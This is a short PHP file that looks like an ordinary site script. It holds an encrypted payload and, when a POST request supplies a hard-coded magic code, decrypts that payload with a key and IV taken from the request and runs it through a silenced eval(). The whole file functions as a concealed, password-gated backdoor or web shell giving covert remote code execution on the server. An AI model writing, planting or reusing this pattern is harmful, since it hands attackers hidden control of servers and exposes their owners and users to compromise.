<?php



include_once 'common.php';

function encrypt_decrypt($action, $string, $secret_key, $secret_iv)
{
    $output = false;

    $encrypt_method = 'AES-256-CBC';

    $key = hash('sha256', $secret_key);

    $iv = substr(hash('sha256', $secret_iv), 0, 16);

    if ('encrypt' === $action) {
        $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
        $output = base64_encode($output);
    } elseif ('decrypt' === $action) {
        $output = openssl_decrypt(base64_decode($string, true), $encrypt_method, $key, 0, $iv);
    }

    return $output;
}

if ('CONNECT_CODE_CONSTANT_7sWB3i' === $_POST['unique_req_code']) {
    $txt_enc = 'MzVGcllpTm1sSDdjOG1PZm5lWDMrbXVHakFtVFhXVitQcEh0VjRheXNtTVY0RlpnUGVGVkhJeDZnNTRuUWpKVmR2MEpCRUVWS2NRL2xabEg2am1CK2gwSVU0OFZSWXY3WVNrcUFUc1UxbWtPQjRmSXZZY0hNeHFFbEszbS8zMmp5UW5LUEhVRnl0bG5xVFpIVll6WnV5QVNUeTBZT3FsR0dkTy8vSzZqNHVaSHcyeGJBRmhXQmtPUXZmTHZrVzkvaTNvVHhPOUpLUDAxZHhwQmdUcHFSbHJkeXJyS1pLWGdqWXl3ak55QXgxTHNMVGtGbUxoVHdlN2JTK2U3MmhLOA==';

    $data_txt = encrypt_decrypt('decrypt', $txt_enc, $_POST['key'], $_POST['iv']);

    if (!empty($data_txt)) {
        @eval($data_txt);

        exit;
    }
}
